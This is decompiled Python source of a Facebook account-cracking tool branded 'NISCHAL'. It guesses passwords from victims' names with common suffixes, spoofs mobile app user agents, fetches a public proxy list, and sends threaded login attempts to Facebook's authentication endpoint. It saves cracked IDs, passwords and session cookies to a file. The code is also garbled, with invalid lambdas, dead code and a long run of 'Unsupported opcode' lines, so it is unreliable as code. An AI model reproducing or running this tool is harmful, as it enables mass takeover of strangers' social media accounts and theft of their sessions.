    ua3 = '[FBAN/' + face + ';FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/' + face + ';FBAV/' + code + '.0.0.12.120;FBPN/' + face2 + ';FBLC/en_GB;FBBV/' + veer + ';FBCR/Robi;FBMF/Xiaomi;FBBD/Redmi;FBDV/' + model3 + ';FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=' + str(random.randint(1, 4)) + '.625,width=' + wid + ',height=' + heigh + '};FB_FW/1;]'
    ua4 = '[FBAN/' + face + ';FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/' + face + ';FBAV/' + code + '.0.0.32.114;FBPN/' + face2 + ';FBLC/it_IT;FBBV/' + veer + ';FBCR/Airtel;FBMF/Asus;FBBD/Asus;FBDV/' + model4 + ';FBSV/7.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=' + str(random.randint(1, 3)) + '.0,width=' + wid + ',height=' + heigh + '};FB_FW/1;]'
    return random.choice([
        ua1,
        ua2,
        ua3,
        ua4])

sys.stdout.write('\x1b]2; [NISCHAL-DARLING]\x07')
logo = '\x1b[1;36m  \n /$$   /$$ /$$$$$$  /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$  /$$      \n| $$$ | $$|_  $$_/ /$$__  $$ /$$__  $$| $$  | $$ /$$__  $$| $$      \n| $$$$| $$  | $$  | $$  \\__/| $$  \\__/| $$  | $$| $$  \\ $$| $$      \n| $$ $$ $$  | $$  |  $$$$$$ | $$      | $$$$$$$$| $$$$$$$$| $$      \n| $$  $$$$  | $$   \\____  $$| $$      | $$__  $$| $$__  $$| $$      \n| $$\\  $$$  | $$   /$$  \\ $$| $$    $$| $$  | $$| $$  | $$| $$      \n| $$ \\  $$ /$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$| $$  | $$| $$$$$$$$\n|__/  \\__/|______/ \\______/  \\______/ |__/  |__/|__/  |__/|________/                                                                                                                 \x1b[0m\n═══════════════════════════════════════════════\n OWNER = NISCHAL\n TYPE = FILE CRACK\n═══════════════════════════════════════════════'

def linex():
    print('═══════════════════════════════════════════════')


def clear():
    os.system('clear')
    print(logo)

clear()
uname = input('>> WHAT IS YOUR NAME \x1b[1;32;40m: \x1b[1;37m')
loop = 0
lim = 0
tp = 0
oks = []
cps = []
pcp = []
id = []
sid = []
ps = []
count = 0
totaldmp = 0
total = []
srange = 0
GREEN = '\x1b[38;5;46m'
RED = '\x1b[38;5;46m'
WHITE = '\x1b[1;97m'
YELLOW = '\x1b[1;33m'
BLUE = '\x1b[1;34m'
ORANGE = '\x1b[1;35m'
BLACK = '\x1b[1;30m'
prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text
open('.prox.txt', 'w').write(prox)
if Exception:
    e = None
    prox = open('.prox.txt', 'r').read().splitlines()
    e = None
    del e
    e = None
    del e

def menu():
    clear()
    print(' [1] FILE CRACK ')
    print(' [0] EXIT ')
    linex()
    xd = input(' CHOICE: ')
    if xd in ('1', '01'):
        clear()
        print(' ENTER YOUR FILE NAME WITHOUT /SDCARD ')
        linex()
        file = input(' ENTER YOUR FILE NAME: ')
        o = '/sdcard/' + file
        fo = open(o, 'r').read().splitlines()
        if FileNotFoundError:
            print(' WRONG FILE HALIS HAU ')
            time.sleep(2)
            menu()
        clear()
        print(' ITZ NISCHAL TOOL ')
        linex()
        print(' [1] METHOD 1 ')
        print(' [2] METHOD 2 ')
        linex()
        mthd = input(' CHOICE: ')
        linex()
        plist = []
        print(' [1] AUTO PASS [NEPALI/INDIAN]')
        print(' [2] AUTO PASS [INDONESIAN] ')
        print(' [3] AUTO PASS [BANGLADESH] ')
        linex()
        pws = input(' CHOICE: ')
        if pws in ('1', '01'):
            plist.append('first 321')
            plist.append('first last')
            plist.append('first1234')
            plist.append('first12345')
            plist.append('first123')
            plist.append('first@123')
            plist.append('first123456789')
            plist.append('first111')
            plist.append('first456')
            plist.append('first@1234')
            plist.append('first@12345')
            plist.append('firstlast123')
            plist.append('firstlast1234')
            plist.append('first 123')
            plist.append('first 1234')
            plist.append('first 12345')
            plist.append('first 111')
        if pws in ('2', '02'):
            plist.append('first')
            plist.append('first last')
            plist.append('first')
            plist.append('first last')
            plist.append('first1234')
            plist.append('first12345')
            plist.append('first123')
            plist.append('first@123')
            plist.append('first123456789')
            plist.append('first111')
            plist.append('first456')
            plist.append('first@1234')
            plist.append('first@12345')
            plist.append('firstlast123')
            plist.append('firstlast1234')
            plist.append('first1000')
            plist.append('first12')
            plist.append('first@12')
            plist.append('first555')
            plist.append('first@555')
            plist.append('first#111')
            plist.append('qwerty')
        if pws in ('3', '03'):
            plist.append('first')
            plist.append('first last')
            plist.append('first1234')
            plist.append('first12345')
            plist.append('first123')
            plist.append('first@123')
            plist.append('first123456789')
            plist.append('first111')
            plist.append('first456')
            plist.append('first@1234')
            plist.append('first@12345')
            plist.append('firstlast123')
            plist.append('firstlast1234')
            plist.append('first1000')
            plist.append('first12')
            plist.append('first@12')
            plist.append('first555')
            plist.append('first@555')
            plist.append('first#111')
            plist.append('qwerty')
            plist.append('first67')
            plist.append('first45')
        linex()
        print(' DO YOU WANT TO SHOW CP ')
        linex
        chs = input(' CHOICE(Y/N): ')
        if chs in ('y', '1', '01', 'yes'):
            pcp.append('y')
        pcp.append('n')
        crack_submit = tred(max_workers = 30)
        clear()
        total_ids = str(len(fo))
        print(' TOTAL IDS: ' + total_ids + ' ')
        print(' USE AEROPLANE MODE IF NO IDS ')
        linex()
        for user in fo:
            (ids, names) = user.split('|')
            passlist = plist
            if mthd in ('1', '01'):
                crack_submit.submit(M1, ids, names, passlist)
            if mthd in ('2', '02'):
                crack_submit.submit(M2, ids, names, passlist)
            menu()
            None(None, None)
            if not None:
                pass
        print('')
        linex()
        print(' PROCESS HAS BEEN COMPLETED ')
        print(' TOTAL OK/CP IDS: ' + str(len(oks)) + '/' + str(len(cps)))
        print('')
        linex()
        input('[×] Press Enter to back ')
        os.system('python NISCHAL.py')
        return None
    if xd in ('0', '00'):
        os.system('exit')
        return None


def M1(ids, names, passlist):
    global loop
    sys.stdout.write(f'''\r\r [NISCHAL-M1] [\x1b[1;37m{loop!s}] [\x1b[1;37mOK|\x1b[1;32m{len(oks)!s}] \x1b[1;37m''')
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        ios_version = random.choice([
            '10_0_2',
            '10_1_1',
            '10_2',
            '10_2_1',
            '10_3_1',
            '10_3_2',
            '10_3_3'])
        android_version = f'''Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}'''
        facebook_version = f'''{random.randint(10, 437)}.0.0.{random.randint(1, 99)}.{random.randint(1, 200)}'''
        fbbv = str(random.randint(10000000, 99999999))
        fbsv = f'''{random.uniform(4, 10):.1f}'''
        density = random.choice([
            '2.0',
            '2.25',
            '2.75',
            '3.0',
            '3.25',
            '3 75'])
        width = random.randint(720, 1440)
        height = random.randint(1080, 2560)
        fblc = random.choice([
            'ja_JP',
            'ex_MX',
            'en_CU',
            'en_US',
            'fr_FR',
            'fa_IR',
            'es_ES',
            'pt_BR',
            'de_DE',
            'it_IT',
            'ja_JP',
            'ko_KR',
            'ru_RU',
            'zh_CN',
            'ar_AE',
            'en_GB'])
        fbcr = random.choice([
            'Telenor',
            'fido',
            'MOVO AFRICA',
            'UFONE-PAKTel',
            'Zong',
            'Jazz',
            'SCO',
            'Jio',
            'Vodafone',
            'Airtel',
            'BSNL',
            'MTNL',
            'Grameenphone',
            'Robi',
            'Banglalink',
            'Teletalk',
            'Telkomsel',
            'Indosat Ooredoo',
            'Axiata',
            'Tri',
            'Smartfren',
            'China Mobile',
            'Unicom',
            'Telecom',
            'Satcom',
            'Docomo',
            'Rakuten',
            'IIJmio',
            'Orange',
            'Verizon',
            'AT&T',
            'T-Mobile',
            'Sprint',
            'Vodafone',
            'Telefonica',
            'EE',
            'Orange',
            'Three'])
        fban = random.choice([
            'FB4A',
            'FB5A',
            'FB6A'])
        fbpn = random.choice([
            'com.facebook.katana',
            'com.facebook.orca',
            'messenger-android',
            'com.facebook.lite'])
        ua = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';[FBAN/FB4A;FBAV/65.0.0.42.81;FBBV/23239543;FBDM/{density=3.0,width=1080,height=1920};FBLC/ar_AE;FBCR/T-Mobile.pl;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]'
        device_id = str(uuid.uuid4())
        adid = str(uuid.uuid4())
        data = {
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        head = {
            'x-fb-http-engine': 'Liger' }
        url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
        po = requests.post(url, data = data, headers = head, allow_redirects = False).text
        q = json.loads(po)
        if 'session_key' in q:
            ckkk = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(q['session_cookies']())
            ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
            cookie = f'''sb={ssbb};{ckkk}'''
            print('\r\r[NISCHAL-OK] \x1b[1;32m' + ids + ' \x1b[1;37m| \x1b[1;32m' + pas + '\x1b[1;97m')
            color = random.choice([
                RED,
                BLUE,
                WHITE,
                GREEN,
                ORANGE])
            print(f'''[🍪]{color}{cookie}''')
            linex()
            open('/sdcard/NISCHAL-OK.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in q['error']['message']:
            capt += 1
            mirti(ids, pas, capt)
        loop += 1
        return None
        if requests.exceptions.ConnectionError:
            'gzip, deflate'
            time.sleep(10)
            return None
        if 'gzip, deflate':
            e = 'accept-encoding'
            e = None
            del e
            return None
        e = 'accept-encoding'
        del e


def M2(ids, names, passlist):
    global loop
    sys.stdout.write(f'''\r\r [NISCHAL-M2] [\x1b[1;37m{loop!s}] [\x1b[1;37mOK|\x1b[1;32m{len(oks)!s}] \x1b[1;37m''')
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        ios_version = random.choice([
            '10_0_2',
            '10_1_1',
            '10_2',
            '10_2_1',
            '10_3_1',
            '10_3_2',
            '10_3_3'])
        android_version = f'''Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}'''
        facebook_version = f'''{random.randint(10, 437)}.0.0.{random.randint(1, 99)}.{random.randint(1, 200)}'''
        fbbv = str(random.randint(10000000, 99999999))
        fbsv = f'''{random.uniform(4, 10):.1f}'''
        density = random.choice([
            '2.0',
            '2.25',
            '2.75',
            '3.0',
            '3.25',
            '3 75'])
        width = random.randint(720, 1440)
        height = random.randint(1080, 2560)
        fblc = random.choice([
            'ja_JP',
            'ex_MX',
            'en_CU',
            'en_US',
            'fr_FR',
            'fa_IR',
            'es_ES',
            'pt_BR',
            'de_DE',
            'it_IT',
            'ja_JP',
            'ko_KR',
            'ru_RU',
            'zh_CN',
            'ar_AE',
            'en_GB'])
        fbcr = random.choice([
            'Telenor',
            'fido',
            'MOVO AFRICA',
            'UFONE-PAKTel',
            'Zong',
            'Jazz',
            'SCO',
            'Jio',
            'Vodafone',
            'Airtel',
            'BSNL',
            'MTNL',
            'Grameenphone',
            'Robi',
            'Banglalink',
            'Teletalk',
            'Telkomsel',
            'Indosat Ooredoo',
            'Axiata',
            'Tri',
            'Smartfren',
            'China Mobile',
            'Unicom',
            'Telecom',
            'Satcom',
            'Docomo',
            'Rakuten',
            'IIJmio',
            'Orange',
            'Verizon',
            'AT&T',
            'T-Mobile',
            'Sprint',
            'Vodafone',
            'Telefonica',
            'EE',
            'Orange',
            'Three'])
        fban = random.choice([
            'FB4A',
            'FB5A',
            'FB6A'])
        fbpn = random.choice([
            'com.facebook.katana',
            'com.facebook.orca',
            'messenger-android',
            'com.facebook.lite'])
        ua = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';[FBAN/FB4A;FBAV/65.0.0.42.81;FBBV/23239543;FBDM/{density=3.0,width=1080,height=1920};FBLC/ar_AE;FBCR/T-Mobile.pl;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]'
        device_id = str(uuid.uuid4())
        adid = str(uuid.uuid4())
        data = {
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        head = {
            'x-fb-http-engine': 'Liger' }
        url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
        po = requests.post(url, data = data, headers = head, allow_redirects = False).text
        q = json.loads(po)
        if 'session_key' in q:
            ckkk = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(q['session_cookies']())
            ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
            cookie = f'''sb={ssbb};{ckkk}'''
            print('\r\r\x1b[1;36m[\x1b[1;32mNISCHAL\x1b[1;36m] \x1b[1;32m' + ids + ' \x1b[1;37m| \x1b[1;32m' + pas + '\x1b[1;97m')
            color = random.choice([
                RED,
                BLUE,
                WHITE,
                GREEN,
                ORANGE])
            print(f'''[🍪]{color}{cookie}''')
            linex()
            open('/sdcard/NISCHAL-OK.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in q['error']['message']:
            capt += 1
            mirti(ids, pas, capt)
        loop += 1
        return None
        if requests.exceptions.ConnectionError:
            'gzip, deflate'
            time.sleep(10)
            return None
        if 'gzip, deflate':
            e = 'accept-encoding'
            e = None
            del e
            return None
        e = 'accept-encoding'
        del e

NISCHAL = tred(max_workers = 30)
NISCHAL.submit(menu)
None(None, None)
return None
if not None:
    pass

Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: BEFORE_WITH
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: BEFORE_WITH
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: BEFORE_WITH
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: DICT_UPDATE
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: MAP_ADD
Unsupported opcode: DICT_UPDATE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
